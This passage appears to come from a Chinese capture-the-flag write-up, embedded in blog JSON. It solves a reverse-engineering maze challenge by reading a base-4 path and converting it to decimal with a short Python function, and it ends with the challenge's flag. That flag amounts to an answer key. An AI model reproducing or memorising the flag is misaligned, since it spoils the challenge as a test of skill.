,0,0,0,0,0,0 下面看一下 sub_400670 函数 ，结合动调，是十进制转四进制算法。下面就是迷宫出走方式得到两条路径，根据函数判断路径长度是45，所以是上面那条232222322330030000303322223333333222233333333232222322330030000303322222222222333333300033333333然后四进制转十进制得到flag 1234567891011def anyToDecimal(num,n): baseStr = &#123;&quot;0&quot;:0,&quot;1&quot;:1,&quot;2&quot;:2,&quot;3&quot;:3,&quot;4&quot;:4,&quot;5&quot;:5,&quot;6&quot;:6,&quot;7&quot;:7,&quot;8&quot;:8,&quot;9&quot;:9, &quot;a&quot;:10,&quot;b&quot;:11,&quot;c&quot;:12,&quot;d&quot;:13,&quot;e&quot;:14,&quot;f&quot;:15,&quot;g&quot;:16,&quot;h&quot;:17,&quot;i&quot;:18,&quot;j&quot;:19&#125; new_num = 0 nNum = len(num) - 1 for i in num: new_num = new_num + baseStr[i]*pow(n,nNum) nNum = nNum -1 print(new_num)anyToDecimal(&#x27;232222322330030000303322223333333222233333333&#x27;, 4) flag{902741462666576198076399615}","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"迷宫","slug":"迷宫","permalink":"http://example.com/tags/%E8%BF%B7%E5%AE%AB/"},{"name":"进制","slug":"进制","permalink":"http://example.com/tags/%E8%BF%9B%E5%88%B6/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]}]}